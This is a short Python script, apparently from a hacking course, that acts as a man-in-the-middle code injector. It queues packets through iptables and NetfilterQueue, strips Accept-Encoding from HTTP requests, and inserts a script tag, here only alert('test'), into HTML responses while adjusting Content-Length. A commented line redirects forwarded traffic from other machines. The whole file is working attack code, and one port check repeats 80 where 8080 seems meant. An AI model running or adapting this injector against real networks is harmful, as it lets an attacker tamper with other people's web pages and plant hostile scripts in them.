#!/usr/bin/env python

import subprocess
import scapy.all as scapy
import netfilterqueue
import re


def trap_packets():
    #To trap packets from other computer
    #subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])
    #--------------------------------------
    #To trap packets coming to my computer for testing purposes
    subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num","0"])
    subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","0"])

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].chksum
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 8080:
                print("[+] Request")
                pattern = "Accept-Encoding:.*?\\r\\n"
                load = re.sub(pattern,"",load)
                #Uncomment following lines when downgrading from http 1.1 to 1.0
                #if "HTTP/1.1" in load:
                #	load = load.replace("HTTP/1.1", "HTTP/1.0")

            elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                injection_code = "<script>alert('test');</script></body>"
                load = load.replace("</body>",injection_code)
                content_length_search = re.search("(?:Content-Length:\s)(\d+)",load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length,str(new_length))

            if load != scapy_packet[scapy.Raw].load:
                scapy_packet = set_load(scapy_packet,load)
                packet.set_payload(str(scapy_packet))

    packet.accept()

try:
    trap_packets()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables","--flush"])
    print("[-] Flushing iptables and quitting....")
